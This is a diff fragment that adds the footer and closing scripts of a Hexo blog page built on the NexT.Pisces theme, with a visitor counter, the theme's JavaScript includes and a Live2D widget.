+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Noel</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.4.2</div>-->
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
